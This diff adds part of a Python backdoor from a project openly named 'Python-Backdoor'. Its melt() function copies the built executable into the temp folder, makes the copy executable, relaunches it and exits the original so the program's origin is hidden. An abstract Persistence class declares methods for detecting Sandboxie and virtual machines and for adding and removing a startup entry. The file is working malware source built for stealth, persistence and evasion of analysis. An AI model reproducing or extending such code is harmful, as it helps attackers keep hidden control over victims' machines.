@@ -1,0 +1,63 @@
+"""
+https://github.com/xp4xbox/Python-Backdoor
+
+@author    xp4xbox
+"""
+
+import abc
+import os
+import shutil
+import stat
+import subprocess
+import sys
+import tempfile
+
+from src.definitions import platforms
+
+
+def melt():
+    curr_file = os.path.realpath(sys.argv[0])
+
+    # ignore melting if client has not been built
+    if curr_file.endswith(".py"):
+        return
+
+    # get actual .exe
+    curr_file = os.path.realpath(sys.executable)
+
+    tmp = os.path.normpath(tempfile.gettempdir()).lower()
+
+    curr_file_dir = os.path.normpath(os.path.dirname(curr_file)).lower()
+
+    if tmp != curr_file_dir:
+        new_file = os.path.join(tmp, os.path.basename(curr_file))
+        # if there is a problem copying file, abort melting
+        try:
+            shutil.copyfile(curr_file, new_file)
+        except IOError:
+            return
+
+        if platforms.OS in [platforms.DARWIN, platforms.LINUX]:
+            st = os.stat(new_file)
+            os.chmod(new_file, st.st_mode | stat.S_IEXEC)
+
+        subprocess.Popen([new_file, "-r", curr_file])
+        sys.exit(0)
+
+
+class Persistence(metaclass=abc.ABCMeta):
+    @abc.abstractmethod
+    def detect_sandboxie(self):
+        pass
+
+    @abc.abstractmethod
+    def remove_from_startup(self):
+        pass
+
+    @abc.abstractmethod
+    def add_startup(self):
+        pass
+
+    @abc.abstractmethod
+    def detect_vm(self):
+        pass
